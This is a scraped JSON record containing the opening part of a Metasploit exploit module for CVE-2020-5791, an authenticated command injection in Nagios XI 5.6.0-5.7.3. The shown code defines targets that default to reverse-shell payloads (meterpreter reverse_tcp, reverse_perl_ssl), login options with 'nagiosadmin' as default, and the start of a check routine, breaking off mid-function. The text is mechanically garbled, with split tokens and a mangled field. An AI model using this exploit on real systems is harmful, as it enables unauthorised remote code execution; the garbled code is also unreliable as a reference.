{
    "text": "vul_name : Nagios XI 5.7.3 Remote Code Execution ， vul_cve : CVE-2020-5791 ， vul_poc :  ，  # This module requires Metasploit :  ，  # Current source :  ， class MetasploitModule < Msf : Exploit : Remote ， Rank = ExcellentRanking ， include Msf : Exploit : Remote : HttpClient ， include Msf : Exploit : Remote : HTTP : NagiosXi ， include Msf : Exploit : CmdStager ， prepend Msf : Exploit : Remote : AutoCheck ， super (  ， update_info (  ， info ,  ， 'Name' => 'Nagios XI 5.6.0-5.7.3 - Mibs.php Authenticated Remote Code Exection' ,  ， 'Description' => %q{ ， This module exploits CVE-2020-5791 , an OS command injection vulnerability in ， `admin/mibs.php` that enables an authenticated user with admin privileges to achieve ， remote code execution as either the `apache` user or the `www-data` user on NagiosXI ， version 5.6.0 to 5.7.3 inclusive ( exact user depends on the version of NagiosXI ， installed as well as the OS its installed on ) . ， Valid credentials for a Nagios XI admin user are required. This module has ， been successfully tested against Nagios XI 5.7.3 running on CentOS 7. ， } ,  ， 'License' => MSF_LICENSE ,  ， 'Author' => ，  [  ， 'Chris Lyne' ,  # discovery ， 'Matthew Aberegg' ,  # PoC ， 'Erik Wynter' #  @ wyntererik - Metasploit ，  ]  ,  ， ' ，  [  ，  [ 'CVE' , '2020-5791' ]  ,  ，  [ 'EDB' , '48959' ]  ，  ]  ,  ， 'Platform' => %w [ linux unix ]  ,  ， 'Arch' => [ ARCH_X86 , ARCH_X64 , ARCH_CMD ]  ,  ， 'Targets' => ，  [  ，  [  ， 'Linux ( x86/x64 ) ' , { ， 'Arch' => [ ARCH_X86 , ARCH_X64 ]  ,  ， 'Platform' => 'linux' ,  ， 'DefaultOptions' => { 'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp' } ， } ，  ]  ,  ，  [  ， 'CMD' , { ， 'Arch' => [ ARCH_CMD ]  ,  ， 'Platform' => 'unix' ,  ，  # the only reliable payloads against a typical Nagios XI host ( CentOS 7 minimal ) seem to be cmd/unix/reverse_perl_ssl and cmd/unix/reverse_openssl ， 'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_perl_ssl' } ， } ，  ]  ，  ]  ,  ， 'Privileged' => false ,  ， 'DisclosureDate' => '2020-10-20' ,  ， 'DefaultTarget' => 0 ,  ， 'Notes' => ， { ， 'Stability' => [ CRASH_SAFE ]  ,  ， 'SideEffects' => [ ARTIFACTS_ON_DISK , IOC_IN_LOGS ]  ,  ， 'Reliability' => [ REPEATABLE_SESSION ]  ， } ， register_options [  ， OptString.new ( 'USERNAME' ,  [ true , 'Username to authenticate with' , 'nagiosadmin' ]  )  ,  ， OptString.new ( 'PASSWORD' ,  [ true , 'Password to authenticate with' , nil ]  )  ，  ]  ， end ， def username ， datastore [ 'USERNAME' ]  ， end ， def password ， datastore [ 'PASSWORD' ]  ， end ， def finish_install ， datastore [ 'FINISH_INSTALL' ]  ， end ， def check ，  # Use nagios_xi_login to try and authenticate. If authentication succeeds , nagios_xi_login returns ，  # an array containing the http response body of a get request to index.php and the session cookies ， login_result , res_array = nagios_xi_login ( username , password , finish_install )  ， case login_result ， when 1.3 # An error occurred",
    "time": "2021.04.20"
}